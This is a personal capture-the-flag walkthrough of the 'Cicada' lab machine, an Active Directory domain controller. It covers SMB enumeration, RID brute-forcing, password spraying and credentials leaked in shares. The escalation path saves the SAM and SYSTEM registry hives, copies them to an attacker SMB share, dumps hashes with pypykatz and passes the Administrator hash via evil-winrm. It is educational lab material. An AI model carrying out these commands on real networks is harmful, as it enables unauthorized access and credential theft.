RECON
--
Started Of With Doing a Port Scan  
**nmap $ip -p- -T5 -Pn || rustscan --ulimit 5000 $ip -- -sC -sV -Pn**  
This Returned Me 

    |-53/tcp   open  domain        syn-ack Simple DNS Plus
    |-
    |-88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-09-29 11:34:33Z)
    |-
    |-135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
    |-
    |-139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
    |-
    |-389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |-ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    |-Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    |-Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
    |-Public Key type: rsa
    |-Public Key bits: 2048
    |-Signature Algorithm: sha256WithRSAEncryption
    |-Not valid before: 2024-08-22T20:24:16
    |-Not valid after:  2025-08-22T20:24:16
    |-MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
    |-SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
    | 
    |-ssl-date: TLS randomness does not represent time
    | 
    |-445/tcp  open  microsoft-ds? syn-ack
    |
    |-464/tcp  open  kpasswd5?     syn-ack
    |
    |-593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
    |
    |-636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |-ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    |-Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    |-Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
    |-Public Key type: rsa
    |-Public Key bits: 2048
    |-Signature Algorithm: sha256WithRSAEncryption
    |-Not valid before: 2024-08-22T20:24:16
    |-Not valid after:  2025-08-22T20:24:16
    |-MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
    |-SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
    |
    |-ssl-date: TLS randomness does not represent time
    |-3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |-ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    |-Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    |-Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
    |-Public Key type: rsa
    |-Public Key bits: 2048
    |-Signature Algorithm: sha256WithRSAEncryption
    |-Not valid before: 2024-08-22T20:24:16
    |-Not valid after:  2025-08-22T20:24:16
    |-MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
    |-SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
    |
    |-ssl-date: TLS randomness does not represent time
    |
    |-3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |-ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    |-Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    |-Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
    |-Public Key type: rsa
    |-Public Key bits: 2048
    |-Signature Algorithm: sha256WithRSAEncryption
    |-Not valid before: 2024-08-22T20:24:16
    |-Not valid after:  2025-08-22T20:24:16
    |-MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
    |-SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
    |
    |-ssl-date: TLS randomness does not represent time
    |Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
    |
    |-Host script results:
    |-p2p-conficker: 
    |---Checking for Conficker.C or higher...
    |---Check 1 (port 43674/tcp): CLEAN (Timeout)
    |---Check 2 (port 14644/tcp): CLEAN (Timeout)
    |---Check 3 (port 62917/udp): CLEAN (Timeout)
    |---Check 4 (port 13628/udp): CLEAN (Timeout)
    |---0/4 checks are positive: Host is CLEAN or ports are blocked
    |-smb2-security-mode: 
    |----3:1:1: 
    |-----Message signing enabled and required
    |-smb2-time: 
    |---date: 2024-09-29T11:35:22
    |---start_date: N/A
    |-clock-skew: 6h59m59s   

From the Output i could tell this was a Domain Controller inside an active directory enviroment  
There was no website which was weird too see for once  

So As Usual i prioritized SMB first so i did some digging into it  

**smbclient -L \\$ip\\**

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    DEV             Disk      
    HR              Disk      
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share 
    SYSVOL          Disk      Logon server share
Ouput Showed the usual windows shares but HR and DEV were interesting so i started digging more into them  

**smbmap -H $ip -u "guest" -p " "**

    ADMIN$          NO ACCESS       Remote Admin
    C$              NO ACCESS       Default share
    DEV             NO ACCESS
    HR              READ ONLY
    IPC$            READ ONLY       Remote IPC
    NETLOGON        NO ACCESS       Logon server share 
    SYSVOL          NO ACCESS       Logon server share 
i had access to HR through a NULL session, after connecting to it i find one file "Notice from HR.txt"  
Inside this i found a password "Cicada$M6Corpb*@Lp#nZp!8"

From Here i wasnt too sure what i could do since i had no usernames, so finding some usernames was my next goal  
so i tried using kerbrute using some seclists wordlists  

**kerbrute userenum --dc $ip -d cicada.htb <wordlist>**
this returned me nothing other then "administrator" and "guest" which i already knew

so i went to my notes on attacking AD and decided to try RID Brute Forcing with crackmapexec  
**crackmapexec smb $ip -u "guest" -p "" --rid-brute**

        [...snip]
        SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
        SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
        SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
        SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
        SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
        SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
        [...snip]

SHELL AS EMILY.CARLOS
---
and finally i had a list of usernames i could use  
now i can try some password spraying  

**crackmapexec smb $ip -u users.txt -p 'Cicada$M6Corpb\*@Lp#nZp!8' --continue-on-success**

        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
        SMB         10.10.11.35     445    CICADA-DC        [YEP] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
        SMB         10.10.11.35     445    CICADA-DC        [YEP] cicada.htb\Dev:Cicada$M6Corpb*@Lp#nZp!8 
        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 

Now i had a username to go with the Password, Dev and michael.wrightson  
tho i couldnt login to smb for whatever reason with the creds, i was stuck here for a while    
then finally i decided to try out the creds with ldap, and they worked!  

now i could of used LdapSearch but that would take a while to parse through and check out the data so i just used ldapdomaindump 
**ldapdomaindump $ip  -u "cicada.htb\michael.wrightson" -p 'Cicada$M6Corpb\*@Lp#nZp!8'**

from this it gave me a bunch of data, but i focused on the domain_users.html file which i hosted with python to view    
![image](https://github.com/user-attachments/assets/681402cc-012e-4276-a140-e114888b65bf)

and this gave me the password for the user "david.orelious"

        david.orelious : aRt$Lp#7t*VQ!3
these credentials worked with smb finally and allowed me to access the DEV share

inside the DEV share i found 1 file "Backup_script.ps1", inside this it had plaintext credentials

        emily.carlos : Q!3@Lp#M6b*7t*Vt
more fkn checks, smh  
but finally i got that sexy p3wned on crackmapexec for winrm  

so i finally got a shell using evil-winrm  
**evil-winrm -i $ip -u emily.carlos -p 'Q!3@Lp#M6b\*7t\*Vt'**

EMILY --> ADMIN
--
i was stuck here for a bit since im not very good at windows priv esc yet, but after doing some of the basic checks i noticed i was in the "backup operators" group, and i knew from my studying this could be a powerfull positsion to be in  
so i checked out hacktricks
[Hacktricks Privileged Groups](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)  

        Membership in the Backup Operators group provides access to the DC01 file system due to the SeBackup and SeRestore privileges. These privileges 
        enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the FILE_FLAG_BACKUP_SEMANTICS flag. 
        Utilizing specific scripts is necessary for this process.
so after reading i copied SAM and SYSTEM since i couldnt access NTDS.DIS, but SAM still holds the local account hashes like admin guest ect

**reg save hklm\sam c:\Users\emily.carlos\sam**
**reg save hklm\sam c:\Users\emily.carlos\system**

and i succesfully saved them, now all i needed to do was extract these files then use something like secretsdump, mimikatz, pypykatz ect


        ON ATTACKER MACHINE
        impacket-smbserver share $(pwd) -smb2support

        ON WINDOWS MACHINE
        copy sam \\10.10.16.13\share\sam
        copy system \\10.10.16.13\share\system
it worked, now i can just dump the hashes

**pypykatz registry --sam sam system**

        ============== SYSTEM hive secrets ==============
        CurrentControlSet: ControlSet001
        Boot Key: 3c2b033757a49110a9ee680b46e8d620
        ============== SAM hive secrets ==============
        HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Now using WinRM i can just use the admins NTML Hashs, in a pass the hash attack to get access

**evil-winrm -i $ip -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341**

and it worked! i succesfully got root.txt

        
